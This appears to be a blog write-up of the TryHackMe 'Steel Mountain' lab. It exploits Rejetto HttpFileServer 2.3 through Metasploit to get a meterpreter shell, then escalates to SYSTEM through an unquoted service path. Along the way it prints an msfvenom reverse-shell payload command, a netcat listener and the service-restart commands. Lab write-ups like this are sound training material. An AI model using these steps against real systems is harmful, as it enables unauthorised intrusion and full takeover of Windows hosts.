<!doctype html><html lang=en-us dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access."><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:title" content="Steel Mountain"><meta property="og:description" content="Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access."><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/tryhackme/SteelMountain/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-23T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T00:00:00+00:00"><title>Steel Mountain | Notes</title>
<link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png><link rel=canonical href=http://localhost:1313/posts/tryhackme/SteelMountain/><link rel=stylesheet href=/book.min.ac21c8af3949149e40b4b734505156d2f4275906589cacc78b77ca28e8eee72d.css integrity="sha256-rCHIrzlJFJ5AtLc0UFFW0vQnWQZYnKzHi3fKKOju5y0=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.c01d497d2aa93ce552c5b04f396b072626c28bf84ad582a961770782dc24c057.js integrity="sha256-wB1JfSqpPOVSxbBPOWsHJibCi/hK1YKpYXcHgtwkwFc=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>Notes</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-c72485dffab48e9851d40b64ff5c8557 class=toggle>
<label for=section-c72485dffab48e9851d40b64ff5c8557 class="flex justify-between"><a role=button>Tryhackme</a></label><ul><li><a href=/docs/tryhackme/Vulnversity/>Vulnversity</a></li><li><a href=/docs/tryhackme/Blue/>Blue</a></li><li><a href=/docs/tryhackme/Kenobi/>Kenobi</a></li><li><a href=/docs/tryhackme/SteelMountain/>Steel Mountain</a></li><li><a href=/docs/tryhackme/Alfred/>Alfred</a></li><li><a href=/docs/tryhackme/HackPark/>Hack Park</a></li><li><a href=/docs/tryhackme/DailyBugle/>Daily Bugle</a></li></ul></li><li><input type=checkbox id=section-d03949e4a854df2320014bae25b6f4d6 class=toggle>
<label for=section-d03949e4a854df2320014bae25b6f4d6 class="flex justify-between"><a role=button>Hackthebox</a></label><ul><li><a href=/docs/hackthebox/DailyBugle/>Daily Bugle</a></li></ul></li></ul><ul><li><a href=/posts/>Blog</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu>
</label><strong>Steel Mountain</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></aside></header><article class="markdown book-post"><h1><a href=/posts/tryhackme/SteelMountain/>Steel Mountain</a></h1><h5>May 23, 2023</h5><div><a href=/categories/TryHackMe/>TryHackMe</a></div><div><a href=/tags/Scanning/>Scanning</a>,
<a href=/tags/Exploitation/>Exploitation</a>,
<a href=/tags/Enumeration/>Enumeration</a>,
<a href=/tags/Privilege-Escalation/>Privilege Escalation</a></div><p>Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.</p><h1 id=scanning>Scanning
<a class=anchor href=#scanning>#</a></h1><p>Let&rsquo;s begin by scanning the target. We will first scan the target using Rustscan.</p><h1 id=enumeration>Enumeration
<a class=anchor href=#enumeration>#</a></h1><p>There are a lot of ports open and since port 80 is open we will check what&rsquo;s running on that port.</p><p>There is an image displaying their employee of the month and we can see the name Steel Mountain which might be an organization.</p><p>While opening the image in a new tab we can see the name of the image as Bill Harper.</p><p>Now, we will check what&rsquo;s running on port 8080. We can see that there is some file server running. Under the server information, there is mentioned that it is HttpFileServer 2.3.</p><p>On clicking that leads us to this page which shows that it is a Rejetto HttpFileServer 2.3.</p><h1 id=exploitation>Exploitation
<a class=anchor href=#exploitation>#</a></h1><p>We will search in metasploit if we can find any exploits.</p><p>We found a module which is successfully tested on the version 2.3b. So, we will use this.</p><p>We will set all the required options.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>set rhost 10.10.2.217
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>set rport <span style=color:#ae81ff>8080</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>set lhost tun0
</span></span></code></pre></div><p>Run the exploit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>exploit
</span></span></code></pre></div><p>We got the meterpreter reverse shell and we can read the user flag.</p><h1 id=privilege-escalation>Privilege Escalation
<a class=anchor href=#privilege-escalation>#</a></h1><p>Now, we will elevate our privileges. We will download the powershell script which can find common Windows privilege escalation vectors that rely on misconfigurations in the target. We will first download the script to our machine.</p><p>Let&rsquo;s upload it to the target.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>upload powerup.ps1
</span></span></code></pre></div><p>Load the powershell module and use powershell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>load powershell
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>powershell_shell
</span></span></code></pre></div><p>Run the script PowerUp.ps1 that we just downloaded into the target and run it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>. .<span style=color:#ae81ff>\p</span>owerup.ps1
</span></span></code></pre></div><p>We will now run all the checks in this module using the following command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Invoke-AllChecks
</span></span></code></pre></div><p>When we run the command, we can see that there is a unquoted service path vulnerability as we can see it in the checks. More information on unquoted service path vulnerability can be found <a href=https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/>here.</a></p><p>For the service AdvancedSystemCareService9, the CanRestart option is set to true which means that the service can be restarted. We will now create a malicious file and upload it in the IObit folder and then restart the service to get the reverse shell. The file name is set to Advanced because we are uploading the file into the path where the Advanced SystemCare folder is present as we know there is an unquoted service path vulnerability. Since the service AdvancedSystemCareService9 is running as system32, we will be getting a reverse shell as system32.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>msfvenom -p windows/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.2.217 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4443</span> -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
</span></span></code></pre></div><p>Exit the powershell. Using the earlier meterpreter reverse shell, change directory to the path IObit and then upload the malicious file that we created.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>upload Advanced.exe
</span></span></code></pre></div><p>Open another terminal and use netcat listener on port 4443 to get the reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc -lnvp <span style=color:#ae81ff>4443</span>
</span></span></code></pre></div><p>Now, load the command prompt shell using the command in the meterpreter shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>shell
</span></span></code></pre></div><p>Restart the AdvancedSystemCareService9 service by using the following commands.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sc stop AdvancedSystemCareService9
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>sc start AdvancedSystemCareService9
</span></span></code></pre></div><p>Now we get a reverse shell in the other terminal window running as system32!</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></aside></main></body></html>